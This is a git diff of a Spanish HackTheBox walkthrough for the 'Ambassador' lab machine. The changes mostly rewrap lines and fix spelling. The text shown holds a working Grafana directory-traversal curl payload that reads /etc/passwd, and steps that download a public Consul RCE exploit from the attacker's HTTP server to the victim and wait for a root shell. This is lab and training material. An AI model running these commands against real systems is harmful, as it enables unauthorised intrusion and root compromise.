@@ -10,7 +10,10 @@ image:
   alt: Ambassador WriteUp
 ---
 
-Les explicare como comprometer la máquina [Ambassador](https://app.hackthebox.com/machines/499) de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo `Directory Transversal` y `Arbitrary File Read`. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos permitira descargar la base de datos y poder ver la contraseña de un usuario y para la escalada usaremos un script de privilegios usaremos nos aprovecharemos de en exploit de `Consul` con un token que nos lanzará la shell como root.
+Les explicare como comprometer la máquina [Ambassador](https://app.hackthebox.com/machines/499) de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un
+a vulnerabilidad de tipo `Directory Transversal` y `Arbitrary File Read`. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos permitir
+a descargar la base de datos y poder ver la contraseña de un usuario y para la escalada usaremos nos aprovecharemos de en exploit de `Consul` con un token que nos lanzará la s
+hell como root.
 
 
 ## Escaneo NMAP
@@ -43,9 +46,11 @@ Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
            Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)
 ```
 
-Puerto **22** su servicio por defecto es **SSH**, **80** este puerto en su configuración por defecto corre el servicio **HTTP**, MySQL corre en el puerto **3306** y el puerto 3000 fue asignado por el **administrador**
+Puerto **22** su servicio por defecto es **SSH**, **80** este puerto en su configuración por defecto corre el servicio **HTTP**, MySQL corre en el puerto **3306** y el puerto 
+3000 fue asignado por el **administrador**
 ## Enumeración
-Podemos realizar **FUZZING** para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.
+Podemos realizar **FUZZING** para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon
+tramos y tratar de acceder a él.
 Viendo la web nos encontramos con esto:
 
 ![Grafana Login]({{ 'assets/img/commons/ambassador-writeup/grafana.png' | relative_url }}){: .center-image }
@@ -68,12 +73,13 @@ Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos le
 File Type: Python script, ASCII text executable
 Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py
 ```
-La ejecutamos...
+Lo ejecutamos...
 
 ![Searchsploit]({{ 'assets/img/commons/ambassador-writeup/etc.png' | relative_url }}){: .center-image }
 _Searchsploit_
 
-Buscando en internet acerca de este **CVE** nos encontramos con este [blog](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/), nos enseñan a explotarlo de forma manual.
+Buscando en internet acerca de este **CVE** nos encontramos con este [blog](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/), nos
+ enseñan a explotarlo de forma manual.
  ```bash
 ❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$
 
@@ -248,8 +254,26 @@ developer@ambassador:~$ cat user.txt
 developer@ambassador:~$ 
 ```
 ## Enumeración del sistema
+En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archi de configuración de github.
 
-Si nos situamos en la carpeta `/opt` podemos ver un proyecto de github.
+```bash
+developer@ambassador:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .cache
+.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txt
+developer@ambassador:~$ 
+```
+Si leemos el archivo nos dice la ruta donde se encuentra.
+
+```bash
+developer@ambassador:~$ cat .gitconfig 
+[user]
+    name = Developer
+    email = developer@ambassador.local
+[safe]
+    directory = /opt/my-app
+developer@ambassador:~$ 
+```
+Si nos situamos en la carpeta `/opt` podemos ver el proyecto github.
 
 ```bash
 developer@ambassador:/opt/my-app$ ls -a
@@ -316,7 +340,8 @@ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuest
 
 ## Escalada de privilegios
 
-Usando el exploit de [GatoGamer](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API) podemos elevar nuestros privilegios, nos descargamos el repositorio de **GitHub**
+Usando el exploit de [GatoGamer](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API) podemos elevar nuestros privilegios, nos descargamos el repositorio de **GitHub
+**
 , nos montamos un servidor **HTTP** con **Python** 
 
 
@@ -324,7 +349,7 @@ Usando el exploit de [GatoGamer](https://github.com/GatoGamer1155/Hashicorp-Cons
 python -m http.server 80
 ```
 
-En la máquina victima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.
+En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.
 ```bash
 developer@ambassador:~$ wget http://10.10.14.61/exploit.py
 --2023-01-21 05:40:22--  http://10.10.14.61/exploit.py
@@ -333,13 +358,14 @@ HTTP request sent, awaiting response... 200 OK
 Length: 1409 (1.4K) [text/x-python]
 Saving to: ‘exploit.py.1’
 
-exploit.py.1                                  100%[=================================================================================================>]   1.38K  --.-KB/s    in 0s      
+exploit.py.1                                  100%[=================================================================================================>]   1.38K  --.-KB/s    in 
+0s      
 
 2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]
 
 developer@ambassador:~$ 
 ```
-En la máquina victima ejecutamos lo siguiente.
+En la máquina víctima ejecutamos lo siguiente.
 Nota: Recuerda cambiar tu IP de HTB
 En nuestra máquina host nos ponemos en escucha
 
